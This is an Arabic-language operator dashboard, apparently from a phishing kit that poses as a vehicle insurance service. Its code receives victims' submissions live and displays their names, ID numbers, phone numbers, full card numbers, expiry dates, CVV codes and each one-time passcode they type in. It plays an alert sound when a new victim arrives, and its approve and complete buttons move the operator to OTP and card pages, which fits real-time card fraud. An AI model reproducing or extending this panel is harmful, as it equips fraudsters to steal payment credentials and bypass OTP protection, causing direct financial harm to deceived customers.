<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم المشرف</title>
<script src="http://localhost:3000/socket.io/socket.io.js"></script>    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');

        body {
            font-family: 'Tajawal', sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f0f2f5;
            color: #333;
            direction: rtl;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 15px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #2c3e50;
            margin-bottom: 40px;
            font-size: 36px;
            position: relative;
            padding-bottom: 15px;
        }
        h1::after {
            content: '';
            position: absolute;
            bottom: 0;
            right: 50%;
            transform: translateX(50%);
            width: 80px;
            height: 4px;
            background-color: #3498db;
            border-radius: 2px;
        }
        .user-cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 30px;
            align-items: start;
        }
        .user-card {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease, background-color 0.3s ease;
            position: relative;
            border: 1px solid #e0e6ed;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .user-card:hover {
            transform: translateY(-8px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
        }
        .user-card-header {
            background-color: #3498db;
            color: white;
            padding: 20px 25px;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2980b9;
            flex-shrink: 0;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            box-shadow: inset 0 -3px 5px rgba(0, 0, 0, 0.1);
            transition: background-color 0.3s ease;
        }
        .user-card-header:hover {
            background-color: #2980b9;
        }
        .user-card-header .arrow {
            font-size: 28px;
            transition: transform 0.3s ease;
            margin-right: 10px;
            color: rgba(255, 255, 255, 0.8);
        }
        .user-card-header.active .arrow {
            transform: rotate(90deg);
        }
        .user-card-content {
            padding: 0 25px;
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.4s ease-out, padding 0.4s ease-out, opacity 0.4s ease-out, background-color 0.3s ease;
            background-color: #fdfdfd;
            color: #444;
            opacity: 0;
            visibility: hidden;
            flex-grow: 1;
            border-bottom-left-radius: 12px;
            border-bottom-right-radius: 12px;
        }
        .user-card-content.show {
            max-height: 1200px; /* يمكن زيادتها إذا كانت المحتويات طويلة جدًا */
            padding: 25px;
            opacity: 1;
            visibility: visible;
        }
        .user-card-content p {
            margin: 12px 0;
            font-size: 16px;
            line-height: 1.7;
        }
        .user-card-content p strong {
            color: #2c3e50;
            font-weight: 700;
        }
        .details-section {
            margin-top: 25px;
            padding-top: 25px;
            border-top: 1px dashed #cccccc;
        }
        .details-section:first-of-type {
            margin-top: 0;
            padding-top: 0;
            border-top: none;
        }
        .details-section h3 {
            color: #e74c3c;
            font-size: 20px;
            margin-bottom: 15px;
            border-bottom: 2px solid #e74c3c;
            padding-bottom: 8px;
            font-weight: bold;
        }
        .no-data {
            text-align: center;
            color: #7f8c8d;
            font-size: 20px;
            margin-top: 50px;
            grid-column: 1 / -1;
            padding: 30px;
            background-color: #ecf0f1;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }
        .action-buttons {
            margin-top: 30px;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .action-buttons button {
            padding: 14px 25px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 17px;
            font-weight: bold;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            min-width: 120px;
            flex-grow: 1;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
        }
        .action-buttons button:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.15);
        }
        .action-buttons button.approve {
            background-color: #2ecc71;
            color: white;
        }
        .action-buttons button.approve:hover {
            background-color: #27ae60;
        }
        .action-buttons button.reject {
            background-color: #e74c3c;
            color: white;
        }
        .action-buttons button.reject:hover {
            background-color: #c0392b;
        }
        .action-buttons button.complete {
            background-color: #95a5a6;
            color: white;
        }
        .action-buttons button.complete:hover {
            background-color: #7f8c8d;
        }
        .status-message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-weight: bold;
            display: none;
            font-size: 15px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        .status-message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .status-message.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .current-status {
            font-weight: bold;
            padding: 8px 15px;
            border-radius: 6px;
            display: inline-block;
            margin-top: 10px;
            text-transform: capitalize;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
        }
        .status-pending { background-color: #fef9e7; color: #b8860b; border: 1px solid #ffeeba;}
        .status-approved { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb;}
        .status-rejected { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb;}
        .status-completed { background-color: #e0f2f7; color: #2196f3; border: 1px solid #b3e0ed;}
        .user-card-content {
            overflow-y: auto;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #ccc;
            margin-left: 10px;
            flex-shrink: 0;
        }

        .status-dot.online {
            background-color: #2ecc71;
            box-shadow: 0 0 8px rgba(46, 204, 113, 0.6);
        }

        .status-dot.offline {
            background-color: #e74c3c;
        }

        #notification-area {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            width: 90%;
            max-width: 400px;
            background-color: #4CAF50;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            display: none;
            text-align: center;
            font-weight: bold;
            font-size: 18px;
            animation: fadeInOut 5s forwards;
        }

        @keyframes fadeInOut {
            0% { opacity: 0; top: 0px; }
            10% { opacity: 1; top: 20px; }
            90% { opacity: 1; top: 20px; }
            100% { opacity: 0; top: 0px; display: none; }
        }

        .user-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .user-card-header .name-and-dot {
            display: flex;
            align-items: center;
        }

        /* --- الأنماط الجديدة لتغيير لون البوكس بالكامل --- */
        .user-card.filled-card {
            border: 2px solid #2ecc71 !important; /* أخضر */
            background-color: #eafaf1 !important; /* لون خلفية فاتح للأخضر على الكرت بالكامل */
        }
        .user-card.filled-card .user-card-header {
            background-color: #2ecc71 !important; /* لون أخضر داكن للعنوان */
            color: white !important; /* لضمان بقاء النص أبيض */
        }
        .user-card.filled-card .user-card-content {
            background-color: #eafaf1 !important; /* لضمان تطابق لون المحتوى مع الكرت */
        }

        .user-card.filled-otp {
            border: 2px solid #e74c3c !important; /* أحمر */
            background-color: #fdecea !important; /* لون خلفية فاتح للأحمر على الكرت بالكامل */
        }
        .user-card.filled-otp .user-card-header {
            background-color: #e74c3c !important; /* لون أحمر داكن للعنوان */
            color: white !important; /* لضمان بقاء النص أبيض */
        }
        .user-card.filled-otp .user-card-content {
            background-color: #fdecea !important; /* لضمان تطابق لون المحتوى مع الكرت */
        }
        /* ------------------------------------------- */

    </style>
</head>
<body>
    <div class="container">
        <h1>لوحة تحكم المشرف - بيانات العملاء</h1>

        <div class="user-cards-grid" id="data-container">
            <p class="no-data" id="initial-no-data">جاري تحميل البيانات...</p>
        </div>
    </div>

    <audio id="notificationSound" src="new_data_alert.mp3" preload="auto"></audio>
    <script>
        // متغير لتخزين ID الطلبات التي تم عرضها حاليًا
        let currentDisplayedIds = new Set();

        // متغير لتخزين عنصر الصوت
        const notificationSound = document.getElementById('notificationSound');

        // لا نحتاج لـ lastKnownFileModifiedTime مع WebSockets
        // let lastKnownFileModifiedTime = 0;

        // الاتصال بخادم Socket.IO Node.js
        const socket = io('http://localhost:3000');

        socket.on('connect', () => {
            console.log('Connected to WebSocket server');
            // عند الاتصال، خادم Node.js سيرسل initial_data تلقائيًا
        });

        // حدث لاستقبال البيانات الأولية عند الاتصال لأول مرة أو التحديثات
        socket.on('initial_data', (response) => {
            console.log('Initial data received:', response);
            updateDisplay(response.data);
            // لا نحتاج للتحقق من newSubmissionsDetected هنا لأنها بيانات أولية
            // إذا كنت تريد صوت تنبيه عند أول تحميل، أضفه هنا بحذر (يمكن أن يكون مزعجًا)
        });

        // حدث لاستقبال التحديثات الفورية للبيانات
        socket.on('data_updated', (response) => {
            console.log('Data updated event received:', response);
            // تشغيل صوت التنبيه فقط إذا كانت هناك طلبات جديدة تمامًا لم تكن معروضة من قبل
            const newData = response.data;
            let newSubmissionsDetected = false;
            const newFetchedIds = new Set(newData.map(s => s.id_number));

            for (const id of newFetchedIds) {
                if (!currentDisplayedIds.has(id)) {
                    newSubmissionsDetected = true;
                    break;
                }
            }

            if (newSubmissionsDetected && notificationSound) {
                notificationSound.play().catch(error => {
                    console.warn("Autoplay was prevented. User interaction might be required to enable sound.", error);
                });
            }

            // تحديث currentDisplayedIds بالبيانات الجديدة
            currentDisplayedIds = newFetchedIds;

            updateDisplay(newData);
        });

        // رسائل الأخطاء أو قطع الاتصال
        socket.on('disconnect', () => {
            console.log('Disconnected from WebSocket server. Attempting to reconnect...');
            // Socket.IO يعيد الاتصال تلقائياً عادةً
            document.getElementById('initial-no-data').textContent = 'تم قطع الاتصال بالخادم. جاري محاولة إعادة الاتصال...';
            document.getElementById('initial-no-data').style.display = 'block';
        });

        socket.on('error', (error) => {
            console.error('WebSocket error:', error);
            document.getElementById('initial-no-data').textContent = 'حدث خطأ في الاتصال بالخادم: ' + error.message;
            document.getElementById('initial-no-data').style.display = 'block';
        });


        // دالة لإنشاء بطاقة المستخدم HTML
        function createUserCardHTML(submission) {
            const idNumber = submission.id_number ?? 'غير متوفر';
            const ownerName = submission.owner_name ?? 'اسم غير معروف';
            const phone = submission.phone ?? 'غير متوفر';
            const purpose = submission.purpose ?? 'غير متوفر';
            const status = submission.status ?? 'pending';
            const submissionTimestamp = submission.submission_timestamp ?? 'غير متوفر';

            let purposeDetailsHTML = '';
            if (submission.purpose === 'new_insurance') {
                purposeDetailsHTML = `
                    <p><strong>الرقم التسلسلي (استمارة):</strong> ${submission.serial_number_form ?? 'غير متوفر'}</p>
                    <p><strong>سنة الصنع:</strong> ${submission.manufacture_year ?? 'غير متوفر'}</p>
                `;
            } else if (submission.purpose === 'transfer_ownership') {
                purposeDetailsHTML = `
                    <p><strong>سنة الصنع:</strong> ${submission.manufacture_year ?? 'غير متوفر'}</p>
                    <p><strong>الرقم التسلسلي (بطاقة جمركية):</strong> ${submission.serial_number_custom ?? 'غير متوفر'}</p>
                `;
            }

            let insuranceDetailsHTML = '';
            if (submission.insurance_details) {
                const id = submission.insurance_details;
                insuranceDetailsHTML = `
                    <div class="details-section">
                        <h3>تفاصيل التأمين</h3>
                        <p><strong>نوع التأمين:</strong> ${id.insurance_type ?? 'غير متوفر'}</p>
                        <p><strong>تاريخ البدء:</strong> ${id.start_date ?? 'غير متوفر'}</p>
                        <p><strong>غرض الاستخدام:</strong> ${id.usage_purpose ?? 'غير متوفر'}</p>
                        <p><strong>قيمة المركبة:</strong> ${id.car_value ?? 'غير متوفر'} ريال</p>
                        <p><strong>سنة الصنع (تفاصيل التأمين):</strong> ${id.manufacture_year ?? 'غير متوفر'}</p>
                        <p><strong>مكان الإصلاح:</strong> ${id.repair_location ?? 'غير متوفر'}</p>
                        <p><strong>وقت إرسال التأمين:</strong> ${id.timestamp ?? 'غير متوفر'}</p>
                    </div>
                `;
            }

            let paymentDetailsHTML = '';
            if (submission.payment_details) {
                const pd = submission.payment_details;
                paymentDetailsHTML = `
                    <div class="details-section">
                        <h3>تفاصيل الدفع (المبلغ والطريقة)</h3>
                        <p><strong>طريقة الدفع:</strong> ${pd.payment_method ?? 'غير متوفر'}</p>
                        <p><strong>المبلغ الإجمالي:</strong> ${pd.total_amount ?? 'غير متوفر'} ريال</p>
                        <p><strong>وقت الدفع:</strong> ${pd.timestamp ?? 'غير متوفر'}</p>
                    </div>
                `;
            }

            let cardDetailsHTML = '';
            let hasCardDetails = false;
            if (submission.card_details && submission.card_details.card_number) {
                const cd = submission.card_details;
                hasCardDetails = true;
                cardDetailsHTML = `
                    <div class="details-section">
                        <h3>تفاصيل البطاقة</h3>
                        <p><strong>اسم حامل البطاقة:</strong> ${cd.card_name ?? 'غير متوفر'}</p>
                        <p><strong>رقم البطاقة:</strong> ${cd.card_number ?? 'غير متوفر'}</p>
                        <p><strong>تاريخ الانتهاء:</strong> ${cd.expiry_date ?? 'غير متوفر'}</p>
                        <p><strong>CVV:</strong> ${cd.cvv ?? 'غير متوفر'}</p>
                        <p><strong>وقت الإرسال (البطاقة):</strong> ${cd.timestamp ?? 'غير متوفر'}</p>
                    </div>
                `;
            }

            let otpAttemptsHTML = '';
            let hasOtpAttempts = false;
            if (submission.otp_attempts && Array.isArray(submission.otp_attempts) && submission.otp_attempts.length > 0) {
                hasOtpAttempts = true;
                otpAttemptsHTML = `
                    <div class="details-section">
                        <h3>رموز التحقق (OTP) المدخلة:</h3>
                        ${submission.otp_attempts.map((otp, index) => `
                            <p>
                                <strong>المحاولة ${index + 1}:</strong> ${otp.otp_code ?? 'غير متوفر'}
                                (وقت: ${otp.timestamp ?? 'غير متوفر'})
                            </p>
                        `).join('')}
                    </div>
                `;
            } else {
                otpAttemptsHTML = `
                    <div class="details-section">
                        <h3>رموز التحقق (OTP) المدخلة:</h3>
                        <p>لا توجد رموز OTP مدخلة لهذا الطلب.</p>
                    </div>
                `;
            }

            // 🟢 إضافة الفئات الشرطية هنا لتغيير لون البوكس بالكامل
            let cardClasses = '';
            if (hasOtpAttempts) {
                cardClasses = 'filled-otp'; // OTP لها الأولوية في اللون الأحمر
            } else if (hasCardDetails) {
                cardClasses = 'filled-card'; // بيانات البطاقة باللون الأخضر
            }

            return `
                <div class="user-card ${cardClasses}" id="user-${idNumber}">
                    <div class="user-card-header">
                        <div class="name-and-dot">
                            <span class="status-dot online"></span> <span>${ownerName} - #${idNumber}</span>
                        </div>
                        <span class="arrow">&#9656;</span>
                    </div>
                    <div class="user-card-content">
                        <p><strong>رقم الجوال:</strong> ${phone}</p>
                        <p><strong>الغرض:</strong> ${purpose}</p>
                        <p><strong>تاريخ ووقت التقديم:</strong> ${submissionTimestamp}</p>
                        ${purposeDetailsHTML}
                        ${insuranceDetailsHTML}
                        ${paymentDetailsHTML}
                        ${cardDetailsHTML}
                        ${otpAttemptsHTML}

                        <div class="details-section">
                            <h3>الحالة الحالية:
                                <span id="status-${idNumber}"
                                    class="current-status status-${status}">
                                    ${status}
                                </span>
                            </h3>
                        </div>

                        <div class="action-buttons">
                            <button class="approve" onclick="updateUserStatus('${idNumber}', 'approved')">موافق</button>
                            <button class="reject" onclick="updateUserStatus('${idNumber}', 'rejected')">رفض</button>
                            <button class="complete" onclick="updateUserStatus('${idNumber}', 'completed')">مراجعة كاملة</button>
                        </div>
                        <div id="message-${idNumber}" class="status-message" style="display:none;"></div>
                    </div>
                </div>
            `;
        }

        // دالة لتبديل عرض محتوى البطاقة (فتح/إغلاق)
        function toggleCardContent(event) {
            const header = event.currentTarget;
            const content = header.nextElementSibling;
            const arrow = header.querySelector('.arrow');

            document.querySelectorAll('.user-card-header.active').forEach(otherHeader => {
                if (otherHeader !== header) {
                    otherHeader.classList.remove('active');
                    const otherContent = otherHeader.nextElementSibling;
                    otherContent.classList.remove('show');
                    otherHeader.querySelector('.arrow').style.transform = 'rotate(0deg)';
                }
            });

            header.classList.toggle('active');
            content.classList.toggle('show');
            arrow.style.transform = header.classList.contains('active') ? 'rotate(90deg)' : 'rotate(0deg)';
        }

        // دالة لتحديث عرض جميع البيانات (تستقبلها من Socket.IO)
        function updateDisplay(data) {
            const dataContainer = document.getElementById('data-container');
            const noDataMessage = document.getElementById('initial-no-data');

            // إخفاء رسالة "جاري التحميل" أو "لا توجد بيانات" مبدئياً
            if (noDataMessage) {
                noDataMessage.style.display = 'none';
            }

            // مسح البطاقات القديمة
            dataContainer.innerHTML = '';

            if (data && data.length > 0) {
                data.forEach(submission => {
                    dataContainer.innerHTML += createUserCardHTML(submission);
                });
                // إعادة ربط أحداث النقر بعد إضافة البطاقات الجديدة
                document.querySelectorAll('.user-card-header').forEach(header => {
                    header.removeEventListener('click', toggleCardContent); // تجنب تكرار الأحداث
                    header.addEventListener('click', toggleCardContent);
                });
            } else {
                // عرض رسالة "لا توجد بيانات" إذا كانت المصفوفة فارغة
                if (noDataMessage) {
                    noDataMessage.textContent = 'لا توجد بيانات متاحة حالياً.';
                    noDataMessage.style.display = 'block';
                } else {
                    // إذا لم يكن هناك عنصر noDataMessage، قم بإنشائه
                    const p = document.createElement('p');
                    p.className = 'no-data';
                    p.id = 'initial-no-data';
                    p.textContent = 'لا توجد بيانات متاحة حالياً.';
                    dataContainer.appendChild(p);
                }
            }
        }

        // دالة لتحديث حالة المستخدم عبر PHP (تبقى كما هي)
        async function updateUserStatus(idNumber, status) {
            const messageElement = document.getElementById(`message-${idNumber}`);
            const statusSpan = document.getElementById(`status-${idNumber}`);
            messageElement.style.display = 'none';

            try {
                const formData = new FormData();
                formData.append('action', 'update_status');
                formData.append('id_number', idNumber);
                formData.append('status', status);

                const response = await fetch('process_form.php', { // تأكد أن process_form.php يكتب في نفس ملف JSON
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (result.status === 'success') {
                    messageElement.textContent = result.message;
                    messageElement.className = 'status-message success';

                    // تحديث الحالة المعروضة في البطاقة
                    if (statusSpan) {
                        statusSpan.textContent = status;
                        statusSpan.className = `current-status status-${status}`;
                    }

                    messageElement.style.display = 'block';

                    // توجيه المستخدم إذا كانت الحالة موافق أو مكتمل
                    if (status === 'approved') {
                        window.location.href = 'otp.html';
                    } else if (status === 'completed') {
                        window.location.href = 'visa2.html';
                    }

                } else {
                    messageElement.textContent = result.message || 'حدث خطأ غير معروف.';
                    messageElement.className = 'status-message error';
                    messageElement.style.display = 'block';
                }

            } catch (error) {
                console.error('Error updating status:', error);
                messageElement.textContent = 'حدث خطأ في الاتصال بالخادم أثناء تحديث الحالة.';
                messageElement.className = 'status-message error';
                messageElement.style.display = 'block';
            }
        }

        // لا داعي لاستدعاء longPollForData هنا، لأن Socket.IO سيتكفل بالبيانات
        // document.addEventListener('DOMContentLoaded', () => {
        //     longPollForData();
        // });
    </script>

</body>
</html>